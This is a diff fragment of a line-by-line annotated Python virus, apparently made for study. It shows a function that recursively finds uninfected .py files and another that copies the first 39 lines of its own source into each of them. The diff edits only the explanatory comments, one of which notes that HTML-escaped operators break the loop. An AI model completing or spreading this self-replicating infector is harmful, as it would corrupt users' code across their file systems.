@@ -9,7 +9,7 @@ def locate(path):                                             # Declares a funct
     filelist = os.listdir(path)                               # Declares a variable named filelist with an object which will list directories with the given argument as the path
     for fname in filelist:                                    # Begins a loop which will take each directory (filelist) and loop through to:
         if os.path.isdir(path+"/"+fname):                     # check if the filename is a directory 
-            files_targeted.extend(locate(path+"/"+fname))     # if so, it gets added to the list: files_targeted
+            files_targeted.extend(locate(path+"/"+fname))     # if so, locate is called recursively and with each successive directory, files get added (concatenated) to the list: files_targeted
         elif fname[-3:] == ".py":                             # If the last 3 characters in the filename are .py (pyton extension)   
             infected = False                                  # a variable -- infected -- is set to the boolean False
             for line in open(path+"/"+fname):                 # Another for loop opens files and reads them one line at a time to check if: 
@@ -24,7 +24,7 @@ def infect(files_targeted):                                   # Another function
     virus = open(os.path.abspath(__file__))                   # A variable is declared with the object opening this file
     virusstring = ""                                          # Declares an empty value for this variable
     for i,line in enumerate(virus):                           # 
-        if i&gt;=0 and i &lt;39:                              # 
+        if i&gt;=0 and i &lt;39:                              # ??These are HTML operators...if they were correct, it would loop thru and write the first 39 lines to every .py file
             virusstring += line                               # 
     virus.close                                               # Closes the file
     for fname in files_targeted:                              # Loops through each item (file) in the list created earlier
